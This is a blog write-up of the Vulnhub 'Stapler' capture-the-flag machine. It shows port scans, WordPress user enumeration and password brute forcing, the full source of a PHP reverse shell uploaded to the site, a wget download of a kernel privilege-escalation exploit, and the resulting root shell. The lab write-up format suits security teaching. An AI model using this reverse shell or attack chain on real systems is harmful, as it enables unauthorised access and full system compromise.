---
layout:     post
title:      "Vulnhub.com - Stapler"
subtitle:   "Write-Up"
date:       2016-09-15 2:00:00
author:     "W3ndige"
header-img: "img/stapler-header.jpeg"
---

<h1>Introduction</h1>

<p>Todays challenge is going to be more security concerned as we're going to give a try boot2root machine from Vulnhub called Stapler. It's aimed for begining/intermediate pentesters, with goal to get root access. Let's jump straight into the content! </p>

[Stapler](https://www.vulnhub.com/entry/stapler-1,150/ "Stapler")<br>

<h1>Write-Up</h1>

<p>Firstly let's discover IP address of our vulnerable machine. We can use nmap with quick scan options. For me result was <b>10.0.2.7</b> with some open ports but better option would be to perform full intense scan to look for any hidden ports. </p>
{% highlight bash %}
nmap -T4 -F 10.0.2.0/24
{% endhighlight %}

<p>And yeah, now we can see that port <b>12380</b> is hiding some web content. </p>

{% highlight bash %}
root@kali:~# nmap -p 1-65535 -T5 -A -v 10.0.2.7

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-09-11 03:52 EDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:52
Completed NSE at 03:52, 0.00s elapsed
Initiating NSE at 03:52
Completed NSE at 03:52, 0.00s elapsed
Initiating ARP Ping Scan at 03:52
Scanning 10.0.2.7 [1 port]
Completed ARP Ping Scan at 03:52, 0.00s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 03:52
Scanning 10.0.2.7 [65535 ports]
Discovered open port 139/tcp on 10.0.2.7
Discovered open port 53/tcp on 10.0.2.7
Discovered open port 21/tcp on 10.0.2.7
Discovered open port 80/tcp on 10.0.2.7
Discovered open port 3306/tcp on 10.0.2.7
Discovered open port 22/tcp on 10.0.2.7
SYN Stealth Scan Timing: About 45.84% done; ETC: 03:53 (0:00:37 remaining)
Discovered open port 666/tcp on 10.0.2.7
Discovered open port 12380/tcp on 10.0.2.7
Completed SYN Stealth Scan at 03:53, 54.91s elapsed (65535 total ports)
Initiating Service scan at 03:53
Scanning 8 services on 10.0.2.7
Completed Service scan at 03:53, 18.62s elapsed (8 services on 1 host)
Initiating OS detection (try #1) against 10.0.2.7
NSE: Script scanning 10.0.2.7.
Initiating NSE at 03:53
NSE: [ftp-bounce] Couldnt resolve scanme.nmap.org, scanning 10.0.0.1 instead.
Completed NSE at 03:55, 129.02s elapsed
Initiating NSE at 03:55
Completed NSE at 03:55, 1.03s elapsed
Nmap scan report for 10.0.2.7
Host is up (0.00075s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open   http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
|_mysql-info: ERROR: Script execution failed (use -d to debug)
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
MAC Address: 08:00:27:63:08:6F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Uptime guess: 0.002 days (since Sun Sep 11 03:53:05 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED
|   Domain name:
|   FQDN: red
|_  System time: 2016-09-11T10:53:32+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.75 ms 10.0.2.7

NSE: Script Post-scanning.
Initiating NSE at 03:55
Completed NSE at 03:55, 0.00s elapsed
Initiating NSE at 03:55
Completed NSE at 03:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.61 seconds
           Raw packets sent: 131126 (5.771MB) | Rcvd: 64 (3.056KB)

{% endhighlight %}

<p>By running <b>nikto</b> on <b>10.0.2.7:12380</b>, we get few useful hints: that <b>robots.txt</b> is hiding 2 entries <b>/admin112233/</b> and <b>/blogblog/</b>. </p>
{% highlight bash %}
root@kali:~# nikto -host 10.0.2.7:12380
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.7
+ Target Hostname:    10.0.2.7
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2016-09-11 04:02:21 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesnt look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '10.0.2.7' does not match certificates names: Red.Initech
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7690 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2016-09-11 04:04:44 (GMT-4) (143 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

{% endhighlight %}

<p>After visiting <b>https://10.0.2.7:12380/admin112233/</b> we get this message ;) </p>
![beef_hook](/img/stapler/beef_hook.png){:class="img-responsive"}

<p>What about <b>/blogblog/</b> ? It seems as a blog of company called Initech based on Wordpress. </p>

![initech](/img/stapler/initech.png){:class="img-responsive"}

<p>But how can we attack this site? I thought about trying to enumerate the users, brute force the wp-admin page and then see what we can do. Let's start! </p>

<p>Firstly let's try to enumerate any users using wpscan. </p>

{% highlight bash %}
wpscan -u https://10.0.2.7:12380/blogblog/ --enumerate u

    [+] Enumerating usernames ...
    [+] Identified the following 10 user/s:
        +----+---------+-----------------+
        | Id | Login   | Name            |
        +----+---------+-----------------+
        | 1  | john    | John Smith      |
        | 2  | elly    | Elly Jones      |
        | 3  | peter   | Peter Parker    |
        | 4  | barry   | Barry Atkins    |
        | 5  | heather | Heather Neville |
        | 6  | garry   | garry           |
        | 7  | harry   | harry           |
        | 8  | scott   | scott           |
        | 9  | kathy   | kathy           |
        | 10 | tim     | tim             |
        +----+---------+-----------------+
{% endhighlight %}

<p>Now let's brute force the John account. Maybe we'll find something useful? </p>

{% highlight bash %}
wpscan --url https://10.0.2.5:12380/blogblog --wordlist /usr/share/wordlists/rockyou.txt --username john

+----+-------+------+----------+
 | Id | Login | Name | Password |
 +----+-------+------+----------+
 |    | john  |      | incorrect|
 +----+-------+------+----------+
{% endhighlight %}

<p>Here we go! Password for <b>john</b> is <b>incorrect</b>. Quite ironical, right? ;)</p>

![login](/img/stapler/login.png){:class="img-responsive"}


<p>After logging in we can try our luck with <b>php reverse shell</b>. By uploading the php file, setting up a listener and viewing the file we will be able to get the shell.  But firstly let's modify our rever shell script so it will work in this situation. </p>
{% highlight php %}
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.0.2.7';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
{% endhighlight %}

<p>Then let's move into uploading the file into the the plugins section. Notice that it will not actually upload as a plugin but Wordpress will move the php file into the media section. </p>

![php-reverse-1](/img/stapler/php-reverse-1.png){:class="img-responsive"}


<p>Now by viewing the file it will show us URL. Now it's time to set up our listener. </p>

{% highlight bash %}
nc -lvp 1234
{% endhighlight %}

<p>Remember to enter the port same as you entered while configurationg the php revere shell - in my version <b>1234</b>. </p>

![php-reverse-2](/img/stapler/php-reverse-2.png){:class="img-responsive"}

<p>Now let's enter the URL which will start reverse shell. </p>

![php-reverse-3](/img/stapler/php-reverse-3.png){:class="img-responsive"}

<p>Let's see if it works, by viewing the terminal with running listener. </p>

![php-reverse-4](/img/stapler/php-reverse-4.png){:class="img-responsive"}

<p>YES, it works! We've got the shell ready to perform last step - privilage escalation. After looking in exploit-db I have found the script that will allow us to perform this operation - <a href="https://www.exploit-db.com/exploits/39772/">Exploit-db #39772 </a>. We can't download it in our shell session but what we can do is to download it using OS we're using, setup simple HTTP server and then download it to our stapler machine. Start simple HTTP server in the folder where you downloaded the .zip package, you can do this using this python command: </p>

{% highlight bash %}
python -m SimpleHTTPServer 80
{% endhighlight %}

<p>Then download it using the wget tool.</p>

{% highlight bash %}
$ wget http://10.0.2.5/39772.zip
--2016-09-11 13:25:04--  http://10.0.2.5/39772.zip
Connecting to 10.0.2.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7025 (6.9K) [application/zip]
39772.zip: Permission denied

Cannot write to '39772.zip' (Success).
$ ls
bin
boot
dev
etc
home
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz.old
$ cd home     
$ ls
AParnell
CCeaser
CJoo
DSwanger
Drew
ETollefson
Eeth
IChadwick
JBare
JKanode
JLipps
LSolum
LSolum2
MBassin
MFrei
NATHAN
RNunemaker
SHAY
SHayslett
SStroud
Sam
Taylor
elly
jamie
jess
kai
mel
peter
www
zoe
$ cd www
$ ls
$ wget http://10.0.2.5/39772.zip
--2016-09-11 13:26:19--  http://10.0.2.5/39772.zip
Connecting to 10.0.2.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7025 (6.9K) [application/zip]
Saving to: '39772.zip'

     0K ......                                                100%  243M=0s

2016-09-11 13:26:19 (243 MB/s) - '39772.zip' saved [7025/7025]

{% endhighlight %}

<p>I had to move to the folder where I had privilages to write the file. Then we just have to proceed with the instructions of this exploit. </p>

{% highlight bash %}
$ ls
39772.zip
$ unzip 39772.zip
Archive:  39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store         
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store  
  inflating: 39772/crasher.tar       
  inflating: __MACOSX/39772/._crasher.tar  
  inflating: 39772/exploit.tar       
  inflating: __MACOSX/39772/._exploit.tar  
$ ls
39772
39772.zip
__MACOSX
$ cd 39772
$ ls                
crasher.tar
exploit.tar
$ tar xf exploit.tar
$ ls
crasher.tar
ebpf_mapfd_doubleput_exploit
exploit.tar
$ cd ebpf_mapfd_doubleput_exploit
$ ls
compile.sh
doubleput.c
hello.c
suidhelper.c
$ ./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
$ ./doubleput
{% endhighlight %}

<p>Will it work or not? </p>

{% highlight bash %}
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, youll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
whoami
root
cd /root
ls
fix-wordpress.sh
flag.txt
issue
python.sh
wordpress.sql
cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                            .--.
                          | ----- |
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o   o-.            |       |
 .-O o -.o   O )_,._      |       |
( o   O  o )--.-O   o-.-----
 --------  (   o  O    o)  
              ----------
b6b545dc11b7a270f4bad23432190c75162c4a2b

{% endhighlight %}

<p>And yes, we've done it! We have the root access! </p>

<p>It was great challenge, thanks <a href="https://www.vulnhub.com/author/g0tmi1k,21/">G0tim1k</a> for creating this boot2root machine. I hope you had as much fun reading this as I had thinking about the ways to gain root access and finish this challenge. Stay in touch for more machines from Vulnhub.com! </p>

<p>~ Stay safe! </p>
